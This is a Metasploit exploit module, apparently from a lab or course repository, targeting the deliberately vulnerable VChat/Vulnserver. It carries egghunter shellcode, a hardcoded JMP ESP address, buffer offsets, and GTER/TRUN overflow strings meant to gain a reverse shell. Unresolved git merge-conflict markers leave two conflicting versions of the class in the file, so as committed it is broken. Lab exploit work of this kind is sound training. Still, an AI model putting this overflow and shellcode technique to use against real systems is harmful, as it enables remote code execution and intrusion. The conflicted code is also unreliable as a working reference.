##
# The # symbol starts a comment
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
# File path: .msf4/modules/exploits/windows/vulnserver/knock.rb
##
# This module exploits the TRUN command of vulnerable chat server
##

class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module inheriting from the remote exploit class
<<<<<<< HEAD
  Rank = NormalRanking	# Potential impact to the target

  include Msf::Exploit::Remote::Tcp	# Include remote tcp exploit module

  def initialize(info = {})	# i.e. constructor, setting the initial values
    super(update_info(info,
      'Name'           => 'VChat/Vulnserver Buffer Overflow-GTER command Egghunting',	# Name of the target
      'Description'    => %q{	# Explaining what the module does
         This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell. 
      },
      'Author'         => [ 'fxw' ],	## Hacker name
      'License'        => MSF_LICENSE,
      'References'     =>	# References for the vulnerability or exploit
        [
          #[ 'URL', 'https://github.com/DaintyJet/Making-Dos-DDoS-Metasploit-Module-Vulnserver/'],
          [ 'URL', 'https://github.com/DaintyJet/VChat_GTER_EggHunter' ]

        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
        },      
      'Payload'        =>	# How to encode and generate the payload
        {
          'BadChars' => "\x00\x0a\x0d"	# Bad characters to avoid in generated shellcode
        },
      'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
      'Targets'        =>	#  targets for many exploits
      [
        [ 'EssFuncDLL-JMPESP',
          {
            'jmpesp' => 0x62501023 # This will be available in [target['jmpesp']]
          }
        ]
      ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
      
      register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
          [
          OptInt.new('RETOFFSET_GTER', [true, 'Offset of Return Address in function GTER', 135]),
          OptInt.new('RETOFFSET_TRUN', [true, 'Offset of Return Address in function TRUN', 1995]),
          OptString.new('EGG_TAG', [true, '4-byte tag (repeated twice) the egg hunter is searching for', "w00tw00t"]),
          Opt::RPORT(9999),
          Opt::RHOSTS('192.168.7.191')
      ])
      
  end
  def exploit	# Actual exploit
    egghunter = "\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c\x05\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7\xff\xe7"
    relativeshort = "\xe9\x71\xff\xff\xff"
    shellcode = payload.encoded

    print_status("Connecting to target... #{datastore['RETOFFSET_GTER'] - 10 - shellcode.length()}")
    s_1 = TCPSocket.new datastore['RHOST'], datastore['RPORT'] # Connect to the server for first message
    s_2 = TCPSocket.new datastore['RHOST'], datastore['RPORT'] # Connect to the server for first message

    outbound_TRUN = 'TRUN /.:/' + datastore['EGG_TAG'] + shellcode + "\x90"*(datastore['RETOFFSET_TRUN'] - 5 - shellcode.length() - datastore['EGG_TAG'].length()) + relativeshort + [target['jmpesp']].pack('V') + relativeshort # Create the malicious string that will be sent to the target      
    outbound_GTER = 'GTER /.:/' + "\x90"*(10) + egghunter + "\x90"*(datastore['RETOFFSET_GTER'] - 10 - egghunter.length()) + [target['jmpesp']].pack('V') + relativeshort # Create the malicious string that will be sent to the target

    print_status("Sending Shellcode")
    s_2.puts(outbound_TRUN)	# Send the attacking payload

    print_status("Sending EggHunter")
    s_1.puts(outbound_GTER)	# Send the attacking payload
    
  end
end
=======
    Rank = NormalRanking	# Potential impact to the target
  
    include Msf::Exploit::Remote::Tcp	# Include remote tcp exploit module
  
    def initialize(info = {})	# i.e. constructor, setting the initial values
      super(update_info(info,
        'Name'           => 'VChat/Vulnserver Buffer Overflow-GTER command Egghunting',	# Name of the target
        'Description'    => %q{	# Explaining what the module does
           This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell. 
        },
        'Author'         => [ 'fxw' ],	## Hacker name
        'License'        => MSF_LICENSE,
        'References'     =>	# References for the vulnerability or exploit
          [
            #[ 'URL', 'https://github.com/DaintyJet/Making-Dos-DDoS-Metasploit-Module-Vulnserver/'],
            [ 'URL', 'https://github.com/DaintyJet/VChat_GTER_EggHunter' ]

          ],
        'Privileged'     => false,
        'DefaultOptions' =>
          {
            'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
          },      
        'Payload'        =>	# How to encode and generate the payload
          {
            'BadChars' => "\x00\x0a\x0d"	# Bad characters to avoid in generated shellcode
          },
        'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
        'Targets'        =>	#  targets for many exploits
        [
          [ 'EssFuncDLL-JMPESP',
            {
              'jmpesp' => 0x62501023 # This will be available in [target['jmpesp']]
            }
          ]
        ],
        'DefaultTarget'  => 0,
        'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
        register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
            [
            OptInt.new('RETOFFSET', [true, 'Offset of Return Address in function', 135]),
            OptString.new('EGGHUNTER', [true, 'HexString of Egg Hunting Shellcode', "\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c\x05\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7\xff\xe7"]),
            OptString.new('RELATIVESHORT', [true, 'HexString for Relative Short Jump used in EggHunter (GTER)', "\xe9\x71\xff\xff\xff"]),
            Opt::RPORT(9999),
            Opt::RHOSTS('192.168.7.191')
        ])
    end
  
    def exploit	# Actual exploit
      print_status("Connecting to target...")
      connect	# Connect to the target
  
      print_status("class #{datastore['RETOFFSET'] - datastore['EGGHUNTER'].unpack('C*').length()}")
      
      outbound = 'GTER /.:/' + "\x90"*(datastore['RETOFFSET'] - datastore['EGGHUNTER'].unpack('C*').length()) + "\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c\x05\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7\xff\xe7" + [target['jmpesp']].pack('V') + datastore['RELATIVESHORT'] # Create the malicious string that will be sent to the target
  
      print_status("Sending Exploit")
      sock.put(outbound)	# Send the attacking payload
  
      disconnect	# disconnect the connection
    end
  end
>>>>>>> bc644383244903d583e9bb45e10d4dc12ef00601
